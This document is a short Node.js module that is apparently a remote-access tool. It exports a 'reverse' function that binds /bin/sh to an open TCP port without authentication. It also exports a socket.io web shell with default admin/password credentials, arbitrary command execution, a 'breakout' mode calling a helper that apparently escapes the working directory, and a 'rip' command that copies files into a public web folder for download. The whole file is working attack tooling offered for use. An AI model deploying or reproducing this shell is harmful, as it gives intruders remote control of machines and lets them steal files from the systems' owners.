var exec, fs, fusker, net, path, spawn, util, _ref;

_ref = require('child_process'), exec = _ref.exec, spawn = _ref.spawn;

path = require('path');

fusker = require('fusker');

net = require('net');

util = require('util');

fs = require('fs');

module.exports = {
  reverse: function(port) {
    var server, sh;
    sh = spawn('/bin/sh', []);
    server = net.createServer(function(c) {
      c.pipe(sh.stdin);
      return util.pump(sh.stdout, c);
    });
    return server.listen(port);
  },
  start: function(port, username, password) {
    var breakf, io, pdir, server;
    if (username == null) username = 'admin';
    if (password == null) password = 'password';
    breakf = path.join(__dirname, "../break");
    pdir = path.join(__dirname, '../public');
    fusker.config.dir = pdir;
    fusker.config.silent = true;
    server = fusker.http.createServer(port, username, password);
    io = fusker.socket.listen(server);
    return io.sockets.on('connection', function(socket) {
      if (socket.cwd == null) socket.cwd = process.cwd();
      socket.emit('cwd', socket.cwd);
      return socket.on('command', function(msg) {
        var cd, dir, execArgs, file, fpath, here;
        if (msg.indexOf('breakout') === 0) {
          socket.cwd = '/';
          socket.emit('cwd', socket.cwd);
          return socket.broken = true;
        }
        if (msg.indexOf('breakin') === 0) {
          socket.cwd = process.cwd();
          socket.emit('cwd', socket.cwd);
          return socket.broken = false;
        }
        if (msg.indexOf('cd ') === 0) {
          cd = msg.split(' ')[1];
          socket.cwd = path.resolve(socket.cwd, cd);
          return socket.emit('cwd', socket.cwd);
        }
        if (msg.indexOf('!dir') === 0) {
          dir = msg.split(' ')[1] || '.';
          here = fs.readdirSync(dir);
          return socket.emit('stdout', here.join(" "));
        }
        if (msg.indexOf('rip ') === 0) {
          file = msg.split(' ')[1];
          fpath = path.resolve(socket.cwd, file);
          msg = "cp " + fpath + " " + pdir;
          socket.emit('stdout', "" + file + " copied");
        }
        if (socket.broken) {
          msg = "PERL_BADLANG=0 " + breakf + " \"" + msg + "\" \"" + socket.cwd + "\"";
          execArgs = {
            cwd: process.cwd()
          };
        } else {
          execArgs = {
            cwd: socket.cwd
          };
        }
        return exec(msg, execArgs, function(err, stdout, stderr) {
          socket.emit('cwd', socket.cwd);
          if ((stdout != null) && stdout !== "") socket.emit('stdout', stdout);
          if ((stderr != null) && stderr !== "") socket.emit('stderr', stderr);
          if ((err != null) && !stderr) return socket.emit('error', err.message);
        });
      });
    });
  }
};
